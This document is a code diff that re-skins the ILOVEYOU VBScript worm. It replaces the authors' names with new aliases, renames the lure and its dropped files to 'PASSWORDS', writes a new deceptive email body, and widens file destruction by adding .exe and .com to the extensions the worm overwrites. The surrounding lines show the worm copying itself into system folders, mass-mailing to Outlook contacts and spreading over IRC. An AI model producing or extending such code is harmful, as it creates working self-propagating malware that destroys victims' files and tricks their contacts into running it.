@@ -1,5 +1,5 @@
 rem  barok -loveletter(vbe) <i hate go to school>
-rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
+rem by: Shipwreak or   /  maroon81@yandex.com  /  @Maroon 81  /  Jupiter
 On Error Resume Next
 
 rem Setup global variables to be used throughout subroutines and functions.
@@ -42,7 +42,7 @@ Sub main()
   rem LOVE-LETTER-FOR-YOU.TXT.vbs
   c.Copy(dirsystem & "\MSKernel32.vbs")
   c.Copy(dirwin & "\Win32DLL.vbs")
-  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+  c.Copy(dirsystem & "\PASSWORDS.TXT.vbs")
 
   rem Call the other subroutines.
   regruns()
@@ -142,6 +142,8 @@ Sub infectfiles(folderspec)
       Or (ext = "wsh")
       Or (ext = "sct")
       Or (ext = "hta")
+      Or (ext = "exe")
+      Or (ext = "com")
     Then
       Set ap = fso.OpenTextFile(f1.path, 2, true)
 
@@ -206,7 +208,7 @@ Sub infectfiles(folderspec)
         scriptini.WriteLine ";"
         scriptini.WriteLine "n0=on 1:JOIN:#:{"
         scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
-        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
+        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\PASSWORDS.HTM"
         scriptini.WriteLine "n3=}"
         scriptini.close
 
@@ -310,14 +312,14 @@ Sub spreadtoemail()
 
         rem If the contact hasn't yet been sent an email, a new email will be
         rem composed with the virus attached and a "kind" message and the
-        rem subject "ILOVEYOU".
+        rem subject "PASSWORDS".
         If (regad = "") Then
           Set male = out.CreateItem(0)
 
           male.Recipients.Add(malead)
-          male.Subject = "ILOVEYOU"
-          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
-          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+          male.Subject = "PASSWORDS"
+          male.Body = vbcrlf & "my passwords are in this. don't tell anyone."
+          male.Attachments.Add(dirsystem & "\PASSWORDS.TXT.vbs")
           male.Send
 
           rem Sets the registry key to indicate that the email has been sent
@@ -347,7 +349,7 @@ Sub html
   rem itself by leveraging ActiveX. It also listens for mouse and key events,
   rem which will open additional windows of the same page.
   dta1 = "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
-    & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
+  & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@bbvutta ?-? maroon81@yandex.com ?-? @Maroon 81 ?-? Jupiter ?-? November 2021@-@>"
     & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
     & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
     & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
@@ -422,11 +424,11 @@ Sub html
   Next
 
   rem Create the LOVE-LETTER-FOR-YOU.HTM file in the system directory.
-  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
+  Set b = fso.CreateTextFile(dirsystem + "\PASSWORDS.HTM")
   b.close
 
   rem Creates the HTM file from everything above.
-  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
+  Set d = fso.OpenTextFile(dirsystem + "\PASSWORDS.HTM", 2)
   d.write dt5
   d.write join(lines, vbcrlf)
   d.write vbcrlf
